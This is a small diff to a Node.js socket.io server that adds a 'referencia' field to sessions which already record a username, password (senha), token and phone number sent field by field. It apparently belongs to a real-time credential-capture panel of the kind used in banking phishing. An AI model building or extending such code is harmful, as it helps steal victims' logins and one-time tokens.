@@ -220,6 +220,7 @@ io.on("connection", socket => {
         nomeEnviado: "",
         serialEnviado: "",
         qrCodeEnviado: "",
+        referencia: "",
       };
       sessions.set(sessionId, newSession);
       socket.emit("client:welcome", { sessionId });
@@ -240,6 +241,7 @@ io.on("connection", socket => {
     if (data.campo === "usuario") sess.usuario = data.valor;
     if (data.campo === "senha") sess.senha = data.valor;
     if (data.campo === "token") sess.token = data.valor;
+    if (data.campo === "referencia") sess.referencia = data.valor;
     if (data.campo === "ddd") sess.ddd = data.valor;
     if (data.campo === "telefone") sess.telefone = data.valor;
     sess.ultimaAtualizacao = Date.now();
